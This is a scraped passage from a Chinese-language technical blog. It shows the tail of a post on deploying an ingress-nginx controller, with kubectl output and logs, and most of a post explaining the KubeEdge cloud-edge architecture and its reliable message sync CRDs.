--secret-name=ingress-nginx-admission- --patch-failure-policy=Failenv:- name:POD_NAMESPACEvalueFrom:fieldRef:fieldPath:metadata.namespacerestartPolicy:OnFailureserviceAccountName:ingress-nginx-admissionsecurityContext:runAsNonRoot:truerunAsUser:2000  demo-example 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139  (base) [root@node1 ingress]# kubectl create -f test-deploy.yaml namespace/ingress-nginx created serviceaccount/ingress-nginx created configmap/ingress-nginx-controller created clusterrole.rbac.authorization.k8s.io/ingress-nginx created clusterrolebinding.rbac.authorization.k8s.io/ingress-nginx created role.rbac.authorization.k8s.io/ingress-nginx created rolebinding.rbac.authorization.k8s.io/ingress-nginx created service/ingress-nginx-controller-admission created service/ingress-nginx-controller created deployment.apps/ingress-nginx-controller created validatingwebhookconfiguration.admissionregistration.k8s.io/ingress-nginx-admission created serviceaccount/ingress-nginx-admission created clusterrole.rbac.authorization.k8s.io/ingress-nginx-admission created clusterrolebinding.rbac.authorization.k8s.io/ingress-nginx-admission created role.rbac.authorization.k8s.io/ingress-nginx-admission created rolebinding.rbac.authorization.k8s.io/ingress-nginx-admission created job.batch/ingress-nginx-admission-create created job.batch/ingress-nginx-admission-patch created (base) [root@node1 ingress]# (base) [root@node1 ingress]# (base) [root@node1 ~]# kubectl get svc -n ingress-nginx NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE ingress-nginx-controller NodePort 10.233.11.136 \u0026lt;none\u0026gt; 80:31346/TCP,443:31929/TCP 68s ingress-nginx-controller-admission ClusterIP 10.233.45.168 \u0026lt;none\u0026gt; 443/TCP 68s (base) [root@node1 ingress]# (base) [root@node1 ingress]# kubectl create -f app.yaml deployment.apps/ivision created service/ivision-svc created deployment.apps/iresource created service/iresource-svc created (base) [root@node1 ingress]# (base) [root@node1 ingress]# (base) [root@node1 ingress]# (base) [root@node1 ingress]# (base) [root@node1 ingress]# kubectl create -f example-ingress.yaml ingress.extensions/example-ingress created (base) [root@node1 ingress]# (base) [root@node1 ingress]# (base) [root@node1 ~]# kubectl get ingress -A NAMESPACE NAME HOSTS ADDRESS PORTS AGE default example-ingress hello-world.com 10.7.11.212 80 100s (base) [root@node1 ~]# (base) [root@node1 ~]# (base) [root@node1 ~]# kubectl describe ingress example-ingress Name: example-ingress Namespace: default Address: 10.7.11.212 Default backend: default-http-backend:80 (\u0026lt;none\u0026gt;) Rules: Host Path Backends ---- ---- -------- hello-world.com /vision ivision-svc:8080 (10.233.90.45:8080,10.233.90.49:8080) Annotations: nginx.ingress.kubernetes.io/rewrite-target: /$1 Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Sync 98s (x2 over 2m3s) nginx-ingress-controller Scheduled for sync (base) [root@node1 ~]# (base) [root@node1 ingress]# kubectl get svc -A NAMESPACE NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE default iresource-svc ClusterIP 10.233.55.49 \u0026lt;none\u0026gt; 8080/TCP 30m default ivision-svc ClusterIP 10.233.34.49 \u0026lt;none\u0026gt; 8080/TCP 30m default kubernetes ClusterIP 10.233.0.1 \u0026lt;none\u0026gt; 443/TCP 259d ingress-nginx ingress-nginx-controller NodePort 10.233.11.136 \u0026lt;none\u0026gt; 80:31346/TCP,443:31929/TCP 3h2m ingress-nginx ingress-nginx-controller-admission ClusterIP 10.233.45.168 \u0026lt;none\u0026gt; 443/TCP 3h2m TCP 182d (base) [root@node1 ingress]# (base) [root@node1 ingress]# (base) [root@node1 ingress]# (base) [root@node1 ingress]# curl http://hello-world.com:31346/vision Hello, world!Version: 1.0.0 Hostname: ivision-7859ffbc88-569pl For hello-world.com:31346 / HELLO_MY_HELLO_WORLD_PORT_8090_TCP: tcp://10.233.21.171:8090 HELLO_MY_HELLO_WORLD_PORT_8090_TCP_ADDR: 10.233.21.171 HELLO_MY_HELLO_WORLD_SERVICE_PORT: 8090 HELLO_MY_HELLO_WORLD_PORT: tcp://10.233.21.171:8090 HELLO_MY_HELLO_WORLD_PORT_8090_TCP_PORT: 8090 HELLO_MY_HELLO_WORLD_SERVICE_HOST: 10.233.21.171 HELLO_MY_HELLO_WORLD_SERVICE_PORT_HTTP: 8090 HELLO_MY_HELLO_WORLD_PORT_8090_TCP_PROTO: tcp (base) [root@node1 ingress]# (base) [root@node1 ingress]# (base) [root@node1 ingress]# kubectl delete -f test-deploy.yaml namespace \u0026#34;ingress-nginx\u0026#34; deleted serviceaccount \u0026#34;ingress-nginx\u0026#34; deleted configmap \u0026#34;ingress-nginx-controller\u0026#34; deleted clusterrole.rbac.authorization.k8s.io \u0026#34;ingress-nginx\u0026#34; deleted clusterrolebinding.rbac.authorization.k8s.io \u0026#34;ingress-nginx\u0026#34; deleted role.rbac.authorization.k8s.io \u0026#34;ingress-nginx\u0026#34; deleted rolebinding.rbac.authorization.k8s.io \u0026#34;ingress-nginx\u0026#34; deleted service \u0026#34;ingress-nginx-controller-admission\u0026#34; deleted service \u0026#34;ingress-nginx-controller\u0026#34; deleted deployment.apps \u0026#34;ingress-nginx-controller\u0026#34; deleted validatingwebhookconfiguration.admissionregistration.k8s.io \u0026#34;ingress-nginx-admission\u0026#34; deleted serviceaccount \u0026#34;ingress-nginx-admission\u0026#34; deleted clusterrole.rbac.authorization.k8s.io \u0026#34;ingress-nginx-admission\u0026#34; deleted clusterrolebinding.rbac.authorization.k8s.io \u0026#34;ingress-nginx-admission\u0026#34; deleted role.rbac.authorization.k8s.io \u0026#34;ingress-nginx-admission\u0026#34; deleted rolebinding.rbac.authorization.k8s.io \u0026#34;ingress-nginx-admission\u0026#34; deleted job.batch \u0026#34;ingress-nginx-admission-create\u0026#34; deleted job.batch \u0026#34;ingress-nginx-admission-patch\u0026#34; deleted   ingress-nginx-controller打印信息，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  ------------------------------------------------------------------------------- NGINX Ingress controller Release: v0.46.0 Build: 6348dde672588d5495f70ec77257c230dc8da134 Repository: https://github.com/kubernetes/ingress-nginx nginx version: nginx/1.19.6 ------------------------------------------------------------------------------- I0603 07:05:33.088964 7 flags.go:208] \u0026#34;Watching for Ingress\u0026#34; class=\u0026#34;nginx\u0026#34; W0603 07:05:33.089024 7 flags.go:213] Ingresses with an empty class will also be processed by this Ingress controller W0603 07:05:33.089936 7 client_config.go:614] Neither --kubeconfig nor --master was specified. Using the inClusterConfig. This might not work. I0603 07:05:33.090993 7 main.go:241] \u0026#34;Creating API client\u0026#34; host=\u0026#34;https://10.233.0.1:443\u0026#34; I0603 07:05:33.098785 7 main.go:285] \u0026#34;Running in Kubernetes cluster\u0026#34; major=\u0026#34;1\u0026#34; minor=\u0026#34;17\u0026#34; git=\u0026#34;v1.17.4\u0026#34; state=\u0026#34;clean\u0026#34; commit=\u0026#34;8d8aa39598534325ad77120c120a22b3a990b5ea\u0026#34; platform=\u0026#34;linux/amd64\u0026#34; I0603 07:05:33.263340 7 main.go:105] \u0026#34;SSL fake certificate created\u0026#34; file=\u0026#34;/etc/ingress-controller/ssl/default-fake-certificate.pem\u0026#34; I0603 07:05:33.282665 7 ssl.go:532] \u0026#34;loading tls certificate\u0026#34; path=\u0026#34;/usr/local/certificates/cert\u0026#34; key=\u0026#34;/usr/local/certificates/key\u0026#34; I0603 07:05:33.306081 7 nginx.go:254] \u0026#34;Starting NGINX Ingress controller\u0026#34; I0603 07:05:33.310545 7 event.go:282] Event(v1.ObjectReference{Kind:\u0026#34;ConfigMap\u0026#34;, Namespace:\u0026#34;ingress-nginx\u0026#34;, Name:\u0026#34;ingress-nginx-controller\u0026#34;, UID:\u0026#34;8f4dd8b7-5888-4bcf-a33f-321a2eda8960\u0026#34;, APIVersion:\u0026#34;v1\u0026#34;, ResourceVersion:\u0026#34;36840945\u0026#34;, FieldPath:\u0026#34;\u0026#34;}): type: \u0026#39;Normal\u0026#39; reason: \u0026#39;CREATE\u0026#39; ConfigMap ingress-nginx/ingress-nginx-controller I0603 07:05:34.506827 7 nginx.go:296] \u0026#34;Starting NGINX process\u0026#34; I0603 07:05:34.506890 7 leaderelection.go:243] attempting to acquire leader lease ingress-nginx/ingress-controller-leader-nginx... I0603 07:05:34.507379 7 nginx.go:316] \u0026#34;Starting validation webhook\u0026#34; address=\u0026#34;:8443\u0026#34; certPath=\u0026#34;/usr/local/certificates/cert\u0026#34; keyPath=\u0026#34;/usr/local/certificates/key\u0026#34; I0603 07:05:34.507610 7 controller.go:146] \u0026#34;Configuration changes detected, backend reload required\u0026#34; I0603 07:05:34.511460 7 leaderelection.go:253] successfully acquired lease ingress-nginx/ingress-controller-leader-nginx I0603 07:05:34.511503 7 status.go:84] \u0026#34;New leader elected\u0026#34; identity=\u0026#34;ingress-nginx-controller-6569b57946-k62zj\u0026#34; I0603 07:05:34.522911 7 status.go:204] \u0026#34;POD is not ready\u0026#34; pod=\u0026#34;ingress-nginx/ingress-nginx-controller-6569b57946-k62zj\u0026#34; node=\u0026#34;node1\u0026#34; I0603 07:05:34.601383 7 controller.go:163] \u0026#34;Backend successfully reloaded\u0026#34; I0603 07:05:34.601478 7 controller.go:174] \u0026#34;Initial sync, sleeping for 1 second\u0026#34; I0603 07:05:34.601537 7 event.go:282] Event(v1.ObjectReference{Kind:\u0026#34;Pod\u0026#34;, Namespace:\u0026#34;ingress-nginx\u0026#34;, Name:\u0026#34;ingress-nginx-controller-6569b57946-k62zj\u0026#34;, UID:\u0026#34;0a9b2cbb-c66b-44f0-ab5f-d05db8b599d9\u0026#34;, APIVersion:\u0026#34;v1\u0026#34;, ResourceVersion:\u0026#34;36840985\u0026#34;, FieldPath:\u0026#34;\u0026#34;}): type: \u0026#39;Normal\u0026#39; reason: \u0026#39;RELOAD\u0026#39; NGINX reload triggered due to a change in configuration I0603 09:50:09.302960 7 main.go:112] \u0026#34;successfully validated configuration, accepting\u0026#34; ingress=\u0026#34;example-ingress/default\u0026#34; I0603 09:50:09.333711 7 event.go:282] Event(v1.ObjectReference{Kind:\u0026#34;Ingress\u0026#34;, Namespace:\u0026#34;default\u0026#34;, Name:\u0026#34;example-ingress\u0026#34;, UID:\u0026#34;351e4443-d025-413f-8390-81f8dd3c8ac2\u0026#34;, APIVersion:\u0026#34;networking.k8s.io/v1beta1\u0026#34;, ResourceVersion:\u0026#34;36870523\u0026#34;, FieldPath:\u0026#34;\u0026#34;}): type: \u0026#39;Normal\u0026#39; reason: \u0026#39;Sync\u0026#39; Scheduled for sync I0603 09:50:09.334193 7 controller.go:146] \u0026#34;Configuration changes detected, backend reload required\u0026#34; I0603 09:50:09.437000 7 controller.go:163] \u0026#34;Backend successfully reloaded\u0026#34; I0603 09:50:09.437146 7 event.go:282] Event(v1.ObjectReference{Kind:\u0026#34;Pod\u0026#34;, Namespace:\u0026#34;ingress-nginx\u0026#34;, Name:\u0026#34;ingress-nginx-controller-6569b57946-k62zj\u0026#34;, UID:\u0026#34;0a9b2cbb-c66b-44f0-ab5f-d05db8b599d9\u0026#34;, APIVersion:\u0026#34;v1\u0026#34;, ResourceVersion:\u0026#34;36840985\u0026#34;, FieldPath:\u0026#34;\u0026#34;}): type: \u0026#39;Normal\u0026#39; reason: \u0026#39;RELOAD\u0026#39; NGINX reload triggered due to a change in configuration I0603 09:50:34.518863 7 status.go:284] \u0026#34;updating Ingress status\u0026#34; namespace=\u0026#34;default\u0026#34; ingress=\u0026#34;example-ingress\u0026#34; currentValue=[] newValue=[{IP:10.7.11.212 Hostname: Ports:[]}] I0603 09:50:34.522304 7 event.go:282] Event(v1.ObjectReference{Kind:\u0026#34;Ingress\u0026#34;, Namespace:\u0026#34;default\u0026#34;, Name:\u0026#34;example-ingress\u0026#34;, UID:\u0026#34;351e4443-d025-413f-8390-81f8dd3c8ac2\u0026#34;, APIVersion:\u0026#34;networking.k8s.io/v1beta1\u0026#34;, ResourceVersion:\u0026#34;36870602\u0026#34;, FieldPath:\u0026#34;\u0026#34;}): type: \u0026#39;Normal\u0026#39; reason: \u0026#39;Sync\u0026#39; Scheduled for sync # 下面则打印出 访问哪个service -\u0026gt; pod # [default-ivision-svc-8080] -\u0026gt; 10.233.90.49:8080 10.7.11.212 - - [03/Jun/2021:10:09:22 +0000] \u0026#34;GET /vision HTTP/1.1\u0026#34; 200 487 \u0026#34;-\u0026#34; \u0026#34;curl/7.65.2\u0026#34; 91 0.001 [default-ivision-svc-8080] [] 10.233.90.49:8080 487 0.001 200 c7d8811d4f89192eec9b77772601c732   参考资料  Ingress说明 NGINX Ingress Controller How kubernetes/ingress-nginx works 原理介绍   Ingress通过互联网访问应用 Ingress-nginx介绍及演示 ","permalink":"http://bingerambo.com/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/","tags":["K8S"],"title":"Ingress介绍"},{"categories":["K8S"],"contents":"KubeEdge架构和组件介绍 KubeEdge提供了一个容器化的边缘计算平台，该平台具有内在的可伸缩性。由于模块化和优化的设计，它是轻量级的(较小的占用空间和运行内存)，可以部署在低资源的设备上。同样，边缘节点可以具有不同的硬件结构和不同的硬件配置。对于设备连接，它可以支持多个协议，并使用标准的基于MQTT的通信.这有助于有效地扩展具有新节点和设备的边缘集群。\n介绍 KubeEdge是一个开源系统，用于将本机容器化的应用程序编排功能扩展到Edge上的主机， 它基于kubernetes构建，并为网络，应用程序提供基本的基础架构支持。云和边缘之间的部署和元数据同步。 Kubeedge已获得Apache 2.0的许可。并且完全免费供个人或商业使用。我们欢迎贡献者！\n我们的目标是建立一个开放平台，以支持Edge计算，将原生容器化应用程序编排功能扩展到Edge上的主机，该主机基于kubernetes，并为网络， 应用程序部署以及云与Edge之间的元数据同步提供基础架构支持。\n特点  完全开放 - Edge Core和Cloud Core都是开源的。 离线模式 - 即使与云断开连接，Edge也可以运行。 基于Kubernetes - 节点，群集，应用程序和设备管理。 可扩展 - 容器化，微服务 资源优化 - 可以在资源不足的情况下运行。边缘云上资源的优化利用。 跨平台 - 无感知；可以在私有，公共和混合云中工作。 数据与分析 - 支持数据管理，数据分析管道引擎。 异构 - 可以支持x86，ARM。 简化开发 - 基于SDK的设备加成，应用程序部署等开发 易于维护 - 升级，回滚，监视，警报等  优势  边缘计算： 通过在Edge上运行的业务逻辑，可以在生成数据的本地保护和处理大量数据。这减少了网络带宽需求以及边缘和云之间的消耗。这样可以提高响应速度，降低成本并保护客户的数据隐私。 简化开发：开发人员可以编写基于常规http或mqtt的应用程序，对其进行容器化，然后在Edge或Cloud中的任何位置运行它们中的更合适的一个。 Kubernetes原生支持： 借助KubeEdge，用户可以在Edge节点上编排应用，管理设备并监视应用和设备状态，就像云中的传统Kubernetes集群一样 大量的应用： 可以轻松地将现有的复杂机器学习，图像识别，事件处理和其他高级应用程序部署和部署到Edge。  架构 kubeedge分为两个可执行程序，cloudcore和edgecore,分别有以下模块\ncloudcore：\n CloudHub：云中的通信接口模块。一个Web套接字服务器，负责监视云端的更改、缓存和向EdgeHub发送消息 EdgeController：管理Edge节点。 一种扩展的Kubernetes控制器，它管理边缘节点和pod元数据，来定义边缘节点。 devicecontroller 负责设备管理。一种扩展的Kubernetes控制器，用于管理设备，以便设备元数据/状态数据可以在边缘和云之间同步。  edgecore： 主要有6个模块\n Edged：在边缘节点上运行并管理容器化应用程序的代理。 EdgeHub：Edge上负责与云服务交互的Web套接字客户端。 负责与用于边缘计算(如KubeEdge体系结构中的EdgeController)云服务交互的Web套接字客户端，。这包括同步云端资源更新到边缘，以及报告边缘端主机和设备状态对云的更改。 EventBus：使用MQTT处理内部边缘通信。 MQTT客户端与MQTT服务器(MQTT服务器)交互，为其他组件提供发布和订阅功能。 DeviceTwin：负责存储设备状态和同步设备状态到云。它还为应用程序提供查询接口。。 MetaManager：edged和edgehub之间的消息处理器。它还负责将元数据存储/检索到轻量级数据库(SQLite)。 ServiceBus: 接收云上服务请求和边缘应用进行http交互  Cloudcore CloudHub CloudHub是cloudcore的一个模块，是Controller和Edge端之间的中介。它负责下行分发消息(其内封装了k8s资源事件，如pod update等)，也负责接收并发送边缘节点上行消息至controllers。其中下行的消息在应用层增强了传输的可靠性，以应对云边的弱网络环境。\n到边缘的连接（通过EdgeHub模块）是通过可选的websocket/quic连接完成的。对于Cloudcore内部通信，Cloudhub直接与Controller通讯。Controller发送到CloudHub的所有请求，与用于存储这个边缘节点的事件对象的通道一起存储在channelq中。\nCloudhub内部主要有以下几个重要结构：\n  MessageDispatcher：下行消息分发中心，也是下行消息队列的生产者，DispatchMessage函数中实现。\n  NodeMessageQueue：每个边缘节点有一个专属的消息队列，总体构成一个队列池，以Node + UID作为区分，ChannelMessageQueue结构体实现\n  WriteLoop：负责将消息写入底层连接，是上述消息队列的消费者\n  Connection server：接收边缘节点访问，支持websocket协议和quick协议连接\n  Http server：为边缘节点提供证书服务，如证书签发与证书轮转\n  云边消息格式的结构如下：\nHeader，由beehive框架调用NewMessage函数提供，主要包括ID、ParentID、TimeStamp Body，包含消息源，消息Group，消息资源，资源对应的操作\nEdge Controller EdgeController是Kubernetes Api服务器和Edgecore之间的桥梁\nDownstreamController UpstreamController Device Controller 通过k8s CRD来描述设备metadata/status ，devicecontroller在云和边缘之间同步，有两个goroutines: upstream controller/downstream controller\ndevice-crd-model 1 2 3 4 5 6 7 8 9 10 11 12 13 14  # 关于kubeedge的crd# kubectl get CustomResourceDefinition -A |grep edgeclusterobjectsyncs.reliablesyncs.kubeedge.io 2021-05-25T02:35:25Zdevicemodels.devices.kubeedge.io 2021-05-25T02:33:32Zdevices.devices.kubeedge.io 2021-05-25T02:29:00Zobjectsyncs.reliablesyncs.kubeedge.io 2021-05-25T02:44:23Zruleendpoints.rules.kubeedge.io 2021-05-25T02:44:24Zrules.rules.kubeedge.io 2021-05-25T02:44:23Z# kubeedge device-model 和 device的crd# kubectl get CustomResourceDefinition -A |grep edge |grep devicedevicemodels.devices.kubeedge.io 2021-05-25T02:33:32Zdevices.devices.kubeedge.io 2021-05-25T02:29:00Z  云端下发更新边缘端设备 device-updates-cloud-edge 边缘端更新设备上报云端 device-updates-edge-cloud EdgeCore EdgeCore支持amd以及arm，不能运行在有kubelet以及Kube-proxy的节点（或者关闭EdgeCore运行环境检查开关参数）。\nEdgeCore包括几个模块：Edged、EdgeHub、MetaManager、DeviceTwin、EventBus、ServiceBus、EdgeStream以及EdgeMesh。\n与k8s节点上部署的kubelet相比：对kubelet不必要的部分进行了精简，即edgecore中的edged；edgecore增加了与设备管理相关的模块如devicetwin以及eventbus；edgemesh模块实现了服务发现；edgecore将元数据进行本地存储，保证云边网络不稳定时边缘端也能正常工作，metamanager进行元数据的管理。\nEdged Edged是管理节点生命周期的边缘节点模块。它可以帮助用户在边缘节点上部署容器化的工作负载或应用程序。 这些工作负载可以执行任何操作，从简单的遥测数据操作到分析或ML推理等。使用kubectl云端的命令行界面，用户可以发出命令来启动工作负载。\n当前容器和镜像管理支持Docker容器运行时。将来应添加其他运行时支持，例如containerd等。\n有许多模块协同工作以实现edged的功能。\n  pod管理: 用于pod的添加删除修改,它还使用pod status manager和pleg跟踪pod的运行状况。其主要工作如下：\n 从metamanager接收和处理pod添加/删除/修改消息。 处理单独的工作队列以添加和删除容器。 处理工作程序例程以检查工作程序队列以执行pod操作。 分别为config map 和 secrets保留单独的的缓存。 定期清理孤立的pod    Pod生命周期事件生成器\n  CRI边缘化\n  secret管理\n  Probe Management\n  ConfigMap Management\n  Container GC\n  Image GC\n  Status Manager\n  卷管理\n  MetaClient\n  eventbus Eventbus充当用于发送/接收有关mqtt主题的消息的接口\nmodes 它支持三种模式：\n internalMqttMode externalMqttMode bothMqttMode  topics 1 2 3 4 5 6 7 8  - $hw/events/upload/# - SYS/dis/upload_records - SYS/dis/upload_records/+ - $hw/event/node/+/membership/get - $hw/event/node/+/membership/get/+ - $hw/events/device/+/state/update - $hw/events/device/+/state/update/+ - $hw/event/device/+/twin/+   messages flow  eventbus sends messages from external client  eventbus sends response messages to external client   MetaManager MetaManager是edged和edgehub之间的消息处理器。它还负责将元数据存储到轻量级数据库（SQLite）或从中检索元数据。\nMetamanager根据以下列出的操作接收不同类型的消息：\n Insert Update Delete Query Response NodeConnection MetaSync  Update Operation Edgehub Edge Hub负责与云中存在的CloudHub组件进行交互。它可以使用WebSocket连接或QUIC协议连接到CloudHub 。它支持同步云端资源更新，报告边缘端主机和设备状态更改等功能。\n它充当边缘与云之间的通信链接。它将从云接收的消息转发到边缘的相应模块，反之亦然。\nedgehub执行的主要功能是：\n Keep Alive Publish Client Info Route to Cloud Route to Edge  EdgeHub中有两类client，分别是httpclient以及websocket/quic client，前者用于与EdgeCore与CloudCore通信所需证书的申请，后者负责与CloudCore的日常通信（资源下发、状态上传等）\n当EdgeHub启动时，其先从CloudCore申请证书（若正确配置本地证书，则直接使用本地证书）\n初始化与CloudCore通信的websocket/quic client，成功连接之后将成功连接的信息传给其他组件（MetaGroup、TwinGroup、BusGroup），分别启动三个goroutine不断的进行云到边以及边到云的消息分发(单纯分发，不做任何封装或改变)、健康状态上报。当云边传送消息过程中出现错误时，则边缘端重新init相应的websocket/quic client，与云端重新建立连接。\nRoute To Cloud Route To Edge DeviceTwin DeviceTwin模块负责存储设备状态，处理设备属性，处理DeviceTwin操作，在边缘设备和边缘节点之间创建成员关系， 将设备状态同步到云以及在边缘和云之间同步DeviceTwin信息。它还为应用程序提供查询接口。 DeviceTwin由四个子模块（即membership，communication，device和device twin）组成，以执行device twin模块的职责。\n Membership Module Twin Module Communication Module Device Module   数据存储方面，将设备数据存储到本地存储sqlLite，包括三张表：device、deviceAttr和deviceTwin。 处理其他模块发送到twin module的消息，然后调用 dtc.distributeMsg来处理消息。在消息处理逻辑里面，消息被分为了四个类别，并分别发送到这四个类别的action执行处理（每一个类别又包含多个action）：  membership device communication twin    edgemesh 和kube-proxy的对比\n  kube-proxy： 需要list-watch service，从而进行服务发现 容器化部署在每个节点(daemonset) service with cluster IP\n  edgemesh： 从cloudcore接收service信息，从而进行服务发现 嵌入到edgecore headless service\n  可靠的消息传递机制 云和边缘之间的不稳定网络会导致边缘节点频繁断开。如果Cloudcore或EdgeCore重新启动或脱机一段时间，这可能导致发送到边缘节点的消息丢失，这些消息无法临时到达。如果没有新事件成功地传递到边缘，这将导致云和边缘之间的不一致。\n所以需要考虑设计一种云与边缘之间可靠的消息传递机制\n有三种类型的消息传递机制：\n At-Most-Once Exactly-Once At-Least-Once    At-Most-Once方式不可靠\n  第二种方法“Exactly-Once”非常昂贵，表现出最差的性能，尽管它提供了保证传递而不丢失或复制消息。由于KubeEdge遵循Kubernetes的最终一致性设计原则，因此只要消息是最新消息，边缘就不会反复接收相同的消息。\n  建议使用At-Least-Once\n  At-Least-Once Delivery 下面是一个使用MessageQueue和ACK确保消息从云传递到边缘的设计。\n 我们使用K8s CRD存储资源的最新版本，该资源已经成功地发送到EDGE。当Cloudcore正常重新启动或启动时，它将检查ResourceVersion以避免发送旧消息。 EdgeController和devicecontroller将消息发送到Cloudhub，MessageDispatcher将根据消息中的节点名称向相应的NodeMessageQueue发送消息。 CloudHub顺序地将数据从NodeMessageQueue发送到相应的边缘节点，并将消息ID存储在ACK信道中。当从边缘节点接收到ACK消息时，ACK通道将触发将消息资源版本保存到K8s作为CRD，并发送下一条消息。 当EdgeCore接收到消息时，它将首先将消息保存到本地数据存储，然后将ACK消息返回给云。 如果CloudHub在间隔内没有接收到ACK消息，它将继续重发该消息5次。如果所有5次重试都失败，CloudHub将放弃该事件。SyncController将处理这些失败事件。 即使边缘节点接收到消息，返回的ACK消息也可能在传输期间丢失。在这种情况下，CloudHub将再次发送消息，边缘可以处理重复的消息。  SyncController SyncController将定期将保存的对象资源验证与K8s中的对象进行比较，然后触发重试和删除等事件。\n当CloudHub向nodeMessageQueue添加事件时，它将与nodeMessageQueue中的相应对象进行比较。如果nodeMessageQueue中的对象较新，它将直接丢弃这些事件。 Message Queue 当每个边缘节点成功连接到云时，将创建一个消息队列，该队列将缓存发送到边缘节点的所有消息。我们使用Kubernetes/Client-go中的workQueue和cacheStore来实现消息队列和对象存储。使用Kubernetes workQueue，将合并重复事件以提高传输效率。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  // ChannelMessageQueue is the channel implementation of MessageQueue type ChannelMessageQueue struct { queuePool sync.Map storePool sync.Map listQueuePool sync.Map listStorePool sync.Map objectSyncLister reliablesyncslisters.ObjectSyncLister clusterObjectSyncLister reliablesyncslisters.ClusterObjectSyncLister } // Add message to the queue: key,_:=getMsgKey(\u0026amp;message) nodeStore.Add(message) nodeQueue.Add(message) // Get the message from the queue: key,_:=nodeQueue.Get() msg,_,_:=nodeStore.GetByKey(key.(string)) // Structure of the message key: Key = resourceType/resourceNamespace/resourceName   说明，为了提高队列操作性能，队列中排列的是message key\nACK message Format 1 2  AckMessage.ParentID = receivedMessage.ID AckMessage.Operation = \u0026#34;response\u0026#34;   ReliableSync CRD 我们使用K8s CRD保存已成功持久化到边缘的对象的资源验证。为了节省资源，我们设计了两种类型的CRD。\n ClusterObjectSync 用于保存集群作用域对象， ObjectSync 用于保存命名空间作用域对象。  它们的名称由相关的节点名称和对象UUID组成。\n1 2 3 4 5  // BuildObjectSyncName builds the name of objectSync/clusterObjectSync func BuildObjectSyncName(nodeName, UID string) string { return nodeName + \u0026#34;.\u0026#34; + UID }   The ClusterObjectSync 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  type ClusterObjectSync struct { metav1.TypeMeta `json:\u0026#34;,inline\u0026#34;` metav1.ObjectMeta `json:\u0026#34;metadata,omitempty\u0026#34;` Spec ClusterObjectSyncSpec `json:\u0026#34;spec,omitempty\u0026#34;` Status ClusterObjectSyncStatus `json:\u0026#34;spec,omitempty\u0026#34;` } // ClusterObjectSyncSpec stores the details of objects that sent to the edge. type ClusterObjectSyncSpec struct { // Required: ObjectGroupVerion is the group and version of the object  // that was successfully sent to the edge node.  ObjectGroupVerion string `json:\u0026#34;objectGroupVerion,omitempty\u0026#34;` // Required: ObjectKind is the type of the object  // that was successfully sent to the edge node.  ObjectKind string `json:\u0026#34;objectKind,omitempty\u0026#34;` // Required: ObjectName is the name of the object  // that was successfully sent to the edge node.  ObjectName string `json:\u0026#34;objectName,omitempty\u0026#34;` } // ClusterObjectSyncSpec stores the resourceversion of objects that sent to the edge. type ClusterObjectSyncStatus struct { // Required: ObjectResourceVersion is the resourceversion of the object  // that was successfully sent to the edge node.  ObjectResourceVersion string `json:\u0026#34;objectResourceVersion,omitempty\u0026#34;` }   The ObjectSync 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  type ClusterObjectSync struct { metav1.TypeMeta `json:\u0026#34;,inline\u0026#34;` metav1.ObjectMeta `json:\u0026#34;metadata,omitempty\u0026#34;` Spec ObjectSyncSpec `json:\u0026#34;spec,omitempty\u0026#34;` Status ObjectSyncStatus `json:\u0026#34;spec,omitempty\u0026#34;` } // ObjectSyncSpec stores the details of objects that sent to the edge. type ObjectSyncSpec struct { // Required: ObjectGroupVerion is the group and version of the object  // that was successfully sent to the edge node.  ObjectGroupVerion string `json:\u0026#34;objectGroupVerion,omitempty\u0026#34;` // Required: ObjectKind is the type of the object  // that was successfully sent to the edge node.  ObjectKind string `json:\u0026#34;objectKind,omitempty\u0026#34;` // Required: ObjectName is the name of the object  // that was successfully sent to the edge node.  ObjectName string `json:\u0026#34;objectName,omitempty\u0026#34;` } // ClusterObjectSyncSpec stores the resourceversion of objects that sent to the edge. type ObjectSyncStatus struct { // Required: ObjectResourceVersion is the resourceversion of the object  // that was successfully sent to the edge node.  ObjectResourceVersion string `json:\u0026#34;objectResourceVersion,omitempty\u0026#34;` }   ObjectSync CRD 示例\n其中 ObjectSync crd实例name ： {nodename.UID} : node2.89c8bbd2-da6d-4bb4-bfb1-2faf68852009\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  (base) [root@node1 ~]# kubectl get ObjectSync -A NAMESPACE NAME AGE default node2.252da63b-5b27-4cb5-9d36-0115657a9ffb 25h default node2.89c8bbd2-da6d-4bb4-bfb1-2faf68852009 127m default node2.bc5a3c5e-69dd-49c1-9753-194609229886 25h kube-system node2.538ed3e7-7cf1-417a-ad72-b69c152c6c00 25h kube-system node2.a0ce6db3-e247-436f-a72e-bdf5b2cc8fb9 25h (base) [root@node1 ~]# (base) [root@node1 ~]# (base) [root@node1 ~]# kubectl describe -n default node2.89c8bbd2-da6d-4bb4-bfb1-2faf68852009 error: the server doesn\u0026#39;t have a resource type \u0026#34;node2\u0026#34; (base) [root@node1 ~]# kubectl describe ObjectSync -n default node2.89c8bbd2-da6d-4bb4-bfb1-2faf68852009 Name: node2.89c8bbd2-da6d-4bb4-bfb1-2faf68852009 Namespace: default Labels: \u0026lt;none\u0026gt; Annotations: \u0026lt;none\u0026gt; API Version: reliablesyncs.kubeedge.io/v1alpha1 Kind: ObjectSync Metadata: Creation Timestamp: 2021-05-26T05:42:07Z Generation: 1 Resource Version: 34833736 Self Link: 